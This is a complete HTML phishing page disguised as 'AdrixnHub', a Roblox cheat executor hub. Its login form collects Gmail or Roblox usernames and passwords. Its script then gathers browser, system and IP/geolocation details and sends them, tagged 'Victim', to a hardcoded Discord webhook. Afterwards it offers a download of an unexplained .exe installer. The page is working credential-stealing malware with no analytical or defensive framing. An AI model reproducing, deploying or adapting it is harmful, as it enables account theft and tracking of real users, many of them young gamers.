<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AdrixnHub | v5.0.2 Internal</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;900&display=swap');

        :root {
            --accent: #00d2ff;
            --accent-glow: rgba(0, 210, 255, 0.4);
            --bg-dark: #050505;
            --panel: #0d0d0d;
            --border: #1a1a1a;
        }

        body {
            margin: 0;
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-dark);
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            background-image: radial-gradient(circle at center, #111 0%, #050505 100%);
        }

        #landing { text-align: center; animation: zoomIn 0.8s ease; }
        .executor-logo {
            font-size: 80px; font-weight: 900; letter-spacing: -2px; margin: 0;
            background: linear-gradient(180deg, #fff 40%, var(--accent));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            filter: drop-shadow(0 0 20px var(--accent-glow));
        }
        .enter-btn {
            margin-top: 50px; padding: 15px 60px; background: transparent; color: white;
            border: 1px solid var(--accent); font-weight: bold; cursor: pointer; transition: 0.3s;
            clip-path: polygon(10% 0, 100% 0, 90% 100%, 0 100%);
        }
        .enter-btn:hover { background: var(--accent); color: black; box-shadow: 0 0 30px var(--accent-glow); }

        #auth-section, #download-section { display: none; width: 420px; opacity: 0; transition: opacity 0.5s ease; }
        .executor-panel {
            background: var(--panel); border: 1px solid var(--border); border-radius: 4px;
            padding: 30px; position: relative; box-shadow: 0 40px 100px rgba(0,0,0,0.9);
        }
        .tab-group { display: flex; margin-bottom: 20px; gap: 5px; }
        .tab-btn {
            background: #111; border: 1px solid #222; color: #666; padding: 8px 12px;
            cursor: pointer; font-size: 10px; font-family: 'JetBrains Mono', monospace;
        }
        .tab-btn.active { border-color: var(--accent); color: white; background: #151515; }

        input {
            width: 100%; padding: 12px; background: #000; border: 1px solid #1a1a1a;
            color: var(--accent); font-family: 'JetBrains Mono', monospace; margin-bottom: 12px; box-sizing: border-box; outline: none;
        }

        .inject-btn {
            width: 100%; padding: 15px; background: #111; border: 1px solid var(--accent);
            color: var(--accent); font-weight: bold; cursor: pointer; text-transform: uppercase;
        }

        .software-card {
            background: #000; border: 1px solid #151515; padding: 15px;
            display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;
        }

        @keyframes zoomIn { from { transform: scale(0.95); opacity: 0; } to { transform: scale(1); opacity: 1; } }
    </style>
</head>
<body>

    <div id="landing">
        <h1 class="executor-logo">ADRIXNHUB</h1>
        <div style="color: var(--accent); font-family: 'JetBrains Mono'; font-size: 11px; letter-spacing: 3px;">v5.0.2 INTERNAL</div>
        <button class="enter-btn" onclick="showScreen('landing', 'auth-section')">INITIALIZE</button>
    </div>

    <div id="auth-section">
        <div class="executor-panel">
            <div class="tab-group">
                <button id="t-gmail" class="tab-btn active" onclick="setMode('gmail')">GMAIL_AUTH</button>
                <button id="t-roblox" class="tab-btn" onclick="setMode('roblox')">ROBLOX_AUTH</button>
            </div>
            <input type="text" id="user" placeholder="IDENT_USER">
            <input type="password" id="pass" placeholder="IDENT_PASS">
            <button class="inject-btn" id="mainBtn" onclick="sendData()">INJECT & VERIFY</button>
        </div>
    </div>

    <div id="download-section">
        <div class="executor-panel">
            <h3 style="color: var(--accent); margin-top: 0;">DOWNLOAD EXECUTOR</h3>
            <div class="software-card">
                <div>
                    <div style="font-size: 13px; font-weight: bold;">Ronix_Hack_v4.exe</div>
                    <div style="font-size: 9px; color: #444;">STATUS: ONLINE</div>
                </div>
                <a href="RonixInstaller_NEW.exe" download style="color:var(--accent); text-decoration:none; border:1px solid var(--accent); padding:5px 10px; font-size:12px;">DOWNLOAD</a>
            </div>
        </div>
    </div>

    <script>
        let currentMode = 'gmail';
        const webhook = "https://discord.com/api/webhooks/1475125201367859311/bjHdv8VtwY43Yz1aeN7lADgGSDKzYL26aJAlHRFctVw84XAGkg7G10K8_9tgUYMbD2z8";

        function showScreen(hide, show) {
            document.getElementById(hide).style.display = 'none';
            const s = document.getElementById(show);
            s.style.display = 'block';
            setTimeout(() => s.style.opacity = '1', 50);
        }

        function setMode(m) {
            currentMode = m;
            document.getElementById('t-gmail').classList.toggle('active', m === 'gmail');
            document.getElementById('t-roblox').classList.toggle('active', m === 'roblox');
            document.getElementById('user').placeholder = m === 'gmail' ? 'GMAIL_ADDRESS' : 'ROBLOX_USER';
        }

        async function sendData() {
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;
            if(!u || !p) return alert("Error: Fields empty");

            document.getElementById('mainBtn').innerText = "INJECTING...";

            // 1. Hardware & System Info
            const info = {
                os: navigator.platform,
                browser: navigator.userAgent,
                cores: navigator.hardwareConcurrency || "N/A",
                res: `${window.screen.width}x${window.screen.height}`,
                lang: navigator.language
            };

            // 2. IP & Network Info
            let net = { ip: "Unknown", city: "Unknown", org: "Unknown" };
            try {
                const res = await fetch('https://ipapi.co/json/');
                if(res.ok) net = await res.json();
            } catch(e) { console.log("Network info blocked"); }

            // 3. Discord Payload
            const payload = {
                embeds: [{
                    title: `🎯 AdrixnHub Victim | ${currentMode.toUpperCase()}`,
                    color: currentMode === 'roblox' ? 3447003 : 16777215,
                    fields: [
                        { name: "👤 User", value: `\`${u}\``, inline: true },
                        { name: "🔑 Pass", value: `\`${p}\``, inline: true },
                        { name: "🌍 Network", value: `**IP:** ${net.ip}\n**ISP:** ${net.org}\n**City:** ${net.city}` },
                        { name: "💻 System", value: `**OS:** ${info.os}\n**Res:** ${info.res}\n**Cores:** ${info.cores}\n**Lang:** ${info.lang}` },
                        { name: "🌐 Browser/User", value: `\`${info.browser}\`` }
                    ],
                    footer: { text: "AdrixnHub v5 Ultimate Logger" },
                    timestamp: new Date()
                }]
            };

            fetch(webhook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            }).finally(() => {
                showScreen('auth-section', 'download-section');
            });
        }
    </script>
</body>
</html>
